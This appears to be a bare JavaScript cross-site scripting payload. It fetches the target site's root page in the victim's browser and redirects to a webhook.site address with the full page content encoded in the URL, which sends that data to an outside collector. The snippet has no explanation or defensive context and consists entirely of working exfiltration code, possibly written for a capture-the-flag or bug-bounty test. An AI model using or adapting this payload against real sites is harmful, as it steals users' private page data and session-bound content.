var $url = "";

fetch('/')
  .then(res => res.text())
  .then(data => document.location.replace("https://webhook.site/f82ca88a-d292-4eb0-9d6a-fc6f9572c8c9?c=" + encodeURIComponent(data)))


